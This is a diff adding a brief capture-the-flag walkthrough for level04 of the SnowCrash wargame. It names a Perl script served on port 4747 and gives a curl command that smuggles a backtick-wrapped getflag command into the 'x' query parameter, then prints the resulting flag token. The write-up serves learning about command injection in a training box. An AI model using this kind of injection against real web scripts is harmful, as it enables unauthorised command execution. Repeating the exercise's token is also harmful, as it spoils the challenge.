@@ -1,0 +1,6 @@
+- List the files in level04 user home directory to find 'level04.pl' perl script which belongs to flag04 user.
+
+- Send a request to the server script and supply it the parameter 'x=`getflag`' to make it execute getflag, echo its output, then print the output of the echo command.
+
+`curl '[SnowCrashIPAddress]:4747/level04.pl?x=`getflag`'`
+Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
